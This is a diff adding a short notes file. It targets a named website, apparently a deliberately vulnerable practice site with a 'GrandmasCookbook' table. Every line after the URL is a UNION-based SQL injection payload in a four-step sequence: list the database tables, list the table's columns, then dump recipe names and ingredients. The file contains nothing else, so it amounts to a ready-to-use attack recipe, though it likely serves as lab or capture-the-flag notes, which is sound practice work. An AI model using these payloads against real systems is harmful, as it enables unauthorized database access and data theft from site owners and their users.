@@ -1,0 +1,13 @@
+Website: https://weaksauce.azurewebsites.net/
+
+1. Get all the tables
+donotcare' UNION SELECT '0', TABLE_NAME, '0', '0', '0', '0', '0', CURRENT_TIMESTAMP FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dbo';--
+
+2. Get all the columns in GrandmasCookbook.
+donotcare' UNION SELECT '0', COLUMN_NAME, '0', '0', '0', '0', '0', CURRENT_TIMESTAMP FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='GrandmasCookbook';--
+
+3. Get the recipe names
+donotcare' UNION SELECT IsFavorite, RecipeName, '0', '0', '0', '0', '0', CURRENT_TIMESTAMP FROM GrandmasCookbook;--
+
+4. Get the ingredients
+donotcare' UNION SELECT '0', Ingredients, '0', '0', '0', '0', '0', CURRENT_TIMESTAMP FROM GrandmasCookbook;--
